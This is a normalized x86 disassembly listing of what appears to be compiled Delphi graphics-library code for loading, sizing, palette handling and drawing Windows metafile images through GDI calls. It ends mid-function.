xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_3a8bdc5
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_3a64350
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_3a8be68
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax esi
call sub_3a8be68
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_3a8be68
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_3a8be68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8bdcc
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_3a652c4
retn
add esp 0xfffffff0
call sub_3a646e4
sub_3a8be68
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_3a8beeb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax 0x10
call sub_3a6615c
mov esi eax
mov ebx esi
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_3a694ec
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x4 ]
call sub_3a652f4
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
lea eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_3a652f4
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov edx esi
mov eax edi
call sub_3a7a33c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8bef2
lea eax [ ebp - 0xc ]
call sub_3a652a0
retn
sub_3a8befc
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_3a8bf7a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_3a7a494
mov esi [ eax ]
lea edx [ ebp - 0x108 ]
mov eax esi
call sub_3a64260
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_3a65504
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a656c8
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8bf81
lea eax [ ebp - 0x8 ]
call sub_3a652a0
retn
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_3a8bfec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ esi + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ esi + 0x8 ] eax
mov ecx [ r-xdata ]
mov dx 0x3
mov eax esi
call sub_3a8c098
mov ecx [ r-xdata ]
mov dx 0xe
mov eax esi
call sub_3a8c098
mov ecx [ r-xdata ]
mov dx 0x2
mov eax esi
call sub_3a8c098
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a8c06c
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_3a64380
mov eax [ esi + 0x8 ]
call sub_3a64380
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a8c098
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ecx
call sub_3a7a33c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a8c0dc
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_3a7a33c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3a8c140
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3a64350
call sub_3a8c100
call sub_3a8c120
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a8c180
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a7aaa4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a8c1b0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_3a64258
mov edx eax
mov eax [ ebx + 0xc ]
call sub_3a6450c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_3a7abb4
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_3a8c1e4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax esi
mov edx edi
call sub_3a6450c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_3a64380
xor eax eax
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax edi
call [ eax + 0x48 ]
mov esi eax
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_3a64594
mov [ esi + 0x10 ] eax
mov [ esi + 0x1c ] ebx
mov eax ebx
mov dx 0xfffc
call sub_3a64594
mov [ esi + 0x18 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_3a6457c
sub_3a8c260
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
xor eax eax
push ebp
push sub_3a8c2f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
call sub_3a64380
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_3a6457c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_3a64258
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_3a64594
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_3a64594
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a8c340
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
xor edx edx
mov eax esi
call sub_3a8c260
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov edx [ ebx + 0xc ]
mov eax esi
call sub_3a8c260
jmp r-xdata
mov edx ebx
mov eax esi
call sub_3a7aad0
mov edx ebx
mov eax esi
call sub_3a8c260
jmp r-xdata
pop esi
pop ebx
retn
sub_3a8c39c
push ebx
mov ebx eax
cmp [ ebx + 0x12 ] 0x0
je r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_3a8c3c0
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
movzx ebx [ ebp + 0x14 ]
push ebx
movzx ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_3a8c3ec
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a8c4f2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x44 ]
mov ecx 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
movzx ecx [ ebp - 0x44 ]
lea edx [ ebp - 0x43 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x44 ]
call sub_3a65504
mov edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_3a8befc
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
call sub_3a64380
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a8c474
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_3a6457c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8c4f9
lea eax [ ebp - 0x48 ]
call sub_3a652a0
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_3a64594
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_3a64594
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_3a8c479
mov eax [ ebp - 0x4 ]
call sub_3a64380
call sub_3a64c5c
call sub_3a64cb0
mov eax [ ebx + 0xc ]
call sub_3a64380
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_3a6457c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8c4f9
lea eax [ ebp - 0x48 ]
call sub_3a652a0
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_3a64594
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_3a64594
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_3a8c500
push ebx
push esi
push edi
add esp 0xfffffec0
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov [ esp ] 0x0
lea edx [ esp + 0x40 ]
mov eax [ edi ]
call sub_3a64260
lea edx [ esp + 0x40 ]
mov eax esp
mov cl 0x3f
call sub_3a63934
jmp r-xdata
add esp 0x140
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
movzx ecx [ esp ]
inc ecx
mov edx esp
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub_3a8c558
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0xc ] 0x0
setne bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ebx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebx + 0xc ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
sub_3a8c5d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_3a8c3ec
mov eax [ ebp - 0x8 ]
push eax
push sub_3a8c500
push ebp
call sub_3a8c558
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3a8c650
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
call sub_3a883e4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a64370
test bl bl
jle r-xdata
push eax
call DeleteEnhMetaFile
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a8c690
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3a8b8e0
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x21 ] 0x1
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a8c6d8
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_3a8d760
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a7aaa4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a8c708
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
test esi esi
je r-xdata
mov edi [ eax + 0x14 ]
call sub_3a8d760
mov edx esi
mov eax ebx
call sub_3a7aad0
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
mov edx [ eax + 0x28 ]
mov [ ebx + 0x28 ] edx
movzx eax [ eax + 0x2c ]
mov [ ebx + 0x2c ] al
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
call sub_3a8d75c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp edi eax
je r-xdata
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
retn
sub_3a8c79c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
xor ebp ebp
test esi esi
je r-xdata
mov eax [ esp ]
push esi
push edi
mov esi eax
lea edi [ esp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
dec [ esp + 0xc ]
dec [ esp + 0x10 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
mov eax edi
call sub_3a8a340
push eax
call PlayEnhMetaFile
test esi esi
je r-xdata
push 0xffffffff
push esi
mov eax edi
call sub_3a8a340
push eax
call SelectPalette
mov ebp eax
mov eax edi
call sub_3a8a340
push eax
call RealizePalette
push 0xffffffff
push ebp
mov eax edi
call sub_3a8a340
push eax
call SelectPalette
sub_3a8c834
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_3a8c9dc
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x54 ] 0x64
push eax
mov eax [ esp + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x20 ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_3a8c898
push ebx
push esi
push edi
add esp 0xfffffbfc
mov ebx eax
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax edi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x14 ]
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov esi eax
test esi esi
je r-xdata
cmp esi 0x100
jle r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_3a883e4
mov [ esp ] 0x300
mov [ esp + 0x2 ] si
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov eax esp
push eax
call CreatePalette
mov edx [ ebx + 0x28 ]
mov [ edx + 0x14 ] eax
and esi 0xff
sub_3a8c924
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_3a8c9dc
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x50 ] 0x64
push eax
mov eax [ esp + 0x4c ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_3a8c988
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3a8cf08
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_3a7cb9c
pop ecx
sub ecx eax
mov edx esi
mov eax ebx
call sub_3a8cb40
mov edx esi
mov eax ebx
call sub_3a8ca70
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
retn
sub_3a8c9dc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28 ]
call sub_3a8d760
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax esi
call sub_3a8d75c
pop esi
pop ebx
retn
sub_3a8ca04
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esp ] 0x4
jg r-xdata
mov edx esi
mov eax ebx
call sub_3a8cf08
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esp ]
sub ecx 0x4
mov edx esi
mov eax ebx
call sub_3a8cb40
mov edx esi
mov eax ebx
call sub_3a8ca70
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
sub_3a8ca70
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_3a8c9dc
lea edx [ ebp - 0x68 ]
mov ecx 0x64
mov eax edi
call sub_3a7cdc8
cmp [ ebp - 0x40 ] 0x464d4520
je r-xdata
mov eax [ ebp - 0x38 ]
call sub_3a62ee0
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_3a8cb30
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x68 ]
mov ecx 0x64
call sub_3a63154
mov ecx [ ebp - 0x38 ]
sub ecx 0x64
mov edx [ ebp - 0x4 ]
add edx 0x64
mov eax edi
call sub_3a7cdc8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
call SetEnhMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_3a8a63c
mov [ ebx + 0x18 ] 0x0
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x50 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ ebx + 0x10 ] eax
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8cb37
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_3a62efc
retn
call sub_3a8a63c
sub_3a8cb40
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_3a8c9dc
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x22 ] 0x9ac6cdd7
jne r-xdata
call sub_3a8a63c
lea eax [ ebp - 0x22 ]
call sub_3a8b49c
cmp ax [ ebp - 0xe ]
je r-xdata
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x18 ]
movsx edx [ ebp - 0x1c ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0xc ] eax
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x16 ]
movsx edx [ ebp - 0x1a ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0x10 ] eax
mov [ ebp - 0x32 ] 0x8
xor eax eax
mov [ ebp - 0x2e ] eax
xor eax eax
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
mov [ ebp - 0x14 ] 0x60
sub [ ebp - 0x8 ] 0x16
mov eax [ ebp - 0x8 ]
call sub_3a62ee0
mov [ ebp - 0xc ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_3a8ccaf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ esi + 0x28 ]
movzx edx [ ebp - 0x14 ]
mov [ eax + 0x18 ] dx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x96 ]
push eax
push 0x64
mov eax [ ebx + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov [ ebp - 0x32 ] 0x8
mov eax [ ebp - 0x76 ]
mov [ ebp - 0x2e ] eax
mov eax [ ebp - 0x72 ]
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
mov eax [ ebx + 0x8 ]
push eax
call DeleteEnhMetaFile
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_3a8a63c
mov [ esi + 0x2c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8ccb6
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_3a62efc
retn
call sub_3a8a63c
sub_3a8ccc0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a8cd69
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x2c ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_3a8cd47
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_3a6a01c
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_3a6e0f4
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3a8bbb8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8cd4e
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0x5 ]
mov [ eax + 0x2c ] dl
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x0
sub_3a8cda4
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_3a8c9dc
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_3a8ce18
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_3a8ce18
jmp r-xdata
mov [ eax + 0x20 ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_3a8ce18
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x20 ] edx
cmp esi [ eax + 0x10 ]
je r-xdata
mov eax ebx
call sub_3a8c9dc
pop esi
pop ebx
retn
mov eax ebx
call sub_3a8cf68
mov eax [ ebx + 0x28 ]
mov [ eax + 0x10 ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_3a8ce54
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x1c ] edx
cmp esi [ eax + 0xc ]
je r-xdata
mov eax ebx
call sub_3a8c9dc
pop esi
pop ebx
retn
mov eax ebx
call sub_3a8cf68
mov eax [ ebx + 0x28 ]
mov [ eax + 0xc ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_3a8ce94
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
